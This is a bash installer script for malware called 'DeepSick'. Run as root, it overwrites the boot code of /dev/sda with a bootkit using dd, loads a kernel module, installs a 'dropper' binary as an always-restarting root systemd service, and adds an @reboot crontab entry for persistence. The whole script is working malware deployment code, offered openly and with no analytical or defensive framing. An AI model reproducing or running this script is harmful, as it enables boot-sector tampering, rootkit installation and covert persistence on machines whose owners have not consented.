// placeholder
#!/bin/bash
# DeepSick installation script

if [ "$EUID" -ne 0 ]; then
    echo "Must be run as root"
    exit 1
fi

# Install bootkit
echo "[*] Installing bootkit..."
dd if=bin/bootkit.bin of=/dev/sda bs=446 count=1 conv=notrunc
if [ $? -ne 0 ]; then
    echo "[!] Bootkit installation failed"
    exit 1
fi

# Install kernel module
echo "[*] Loading kernel module..."
insmod bin/deepsick.ko
if [ $? -ne 0 ]; then
    echo "[!] Kernel module load failed"
    exit 1
fi

# Install dropper
echo "[*] Installing dropper service..."
cp bin/deepsick_dropper /usr/sbin/deepsick_daemon
chmod 700 /usr/sbin/deepsick_daemon

# Create systemd service
cat > /etc/systemd/system/deepsick.service <<EOF
[Unit]
Description=DeepSick Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/usr/sbin/deepsick_daemon

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable deepsick.service
systemctl start deepsick.service

# Create persistence
(crontab -l 2>/dev/null; echo "@reboot /usr/sbin/deepsick_daemon") | crontab -

echo "[+] DeepSick installation completed successfully"
